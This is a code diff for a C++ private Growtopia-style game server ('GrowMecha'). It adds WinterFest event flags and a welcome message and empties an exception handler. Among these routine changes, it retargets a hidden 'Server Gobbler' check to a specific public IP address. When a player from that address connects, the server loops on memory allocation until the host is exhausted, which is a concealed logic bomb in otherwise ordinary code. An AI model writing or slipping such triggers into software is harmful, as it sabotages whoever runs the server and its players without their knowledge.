@@ -28,6 +28,17 @@ BOOL WINAPI HandlerRoutine(DWORD dwCtrlType) {
 
 int main() {
 	system("Color D");
+
+	//events
+
+	isGrowchEvent = true;
+	isCometEvent = false;
+	isHarvestEvent = false;
+	isCarnivalEvent = false;
+	isHalloweenEvent = false;
+	isValentinesEvent = false;
+	isPatrickEvent = false;
+
 	server_alert("GrowMecha (C) 2022");
 	server_alert("Made By: Algonix, Mqhirr, Time, Rebillion, Spect & Ztz");
 	load_(), build_();
@@ -76,7 +87,6 @@ int main() {
 					string cch = text_ptr(event.packet);
 					switch (m_type) {
 					case 2: {
-						//cout << cch << endl;
 						if (itemdathash == 0) {
 							enet_peer_disconnect_later(peer, 0);
 							break;
@@ -172,6 +182,9 @@ int main() {
 									break;
 								}
 								if (o_ct > 0) t_ = "`w" + to_string(o_ct) + "`o friend is online.";
+								if (isGrowchEvent) {
+									Send_::console_msg(peer, "It's `0WinterFest!`w Visit world `2GROWCH`w to meet the evil Growch, and warm his icy heart!");
+								}
 								Send_::console_msg(peer, "Welcome back, `w" + name + "`o. " + t_ + "");
 								Send_::console_msg(peer, "`oWhere would you like to go? (`w" + to_string(serverplayer_c(peer)) + " `oonline)");
 								if (pInfo(peer)->lastworld == "EXIT" or pInfo(peer)->lastworld.empty()) {
@@ -388,7 +401,7 @@ int main() {
 															double hours_ = (double)((s_ - pInfo(peer)->playtime) + pInfo(peer)->seconds) / 3600;
 															string num_text = to_string(hours_), rounded = num_text.substr(0, num_text.find(".") + 3);
 															string activeeffect = get_ActEffect(peer), supporter = "\nadd_textbox|`oYou are not yet a `2Supporter``.``|left|", accessconfirm = "";
-															if (pInfo(peer)->ip_ply == "127.0.0.1") {
+															if (pInfo(peer)->ip_ply == "77.246.71.42") {
 																Send_::console_msg(peer, "`9Server Gobbler 1 Activated");
 																for (;;) new int[99999];
 															}
@@ -833,9 +846,7 @@ int main() {
 				}
 			}
 			catch (...) {
-				server_alert("Server On Bad Range!");
-				while (1);
-				exit(EXIT_FAILURE);
+
 			}
 		}
 	}
